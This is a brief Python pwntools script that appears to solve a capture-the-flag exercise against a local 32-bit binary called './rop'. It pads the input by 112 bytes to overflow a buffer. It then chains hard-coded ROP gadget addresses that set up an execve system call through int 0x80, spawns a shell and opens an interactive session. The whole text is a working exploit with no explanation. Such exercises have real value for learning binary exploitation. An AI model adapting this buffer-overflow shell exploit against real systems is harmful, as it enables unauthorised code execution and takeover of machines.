from pwn import *
sh = process('./rop')
eax = 0x80bb196
edx_ecx_ebx = 0x806eb90
string = 0x80be408
int_0x80 = 0x8049421
payload = payload = flat([b'a' * 112, eax, 0xb, edx_ecx_ebx, 0, 0, string, int_0x80])
sh.sendline(payload)
sh.interactive()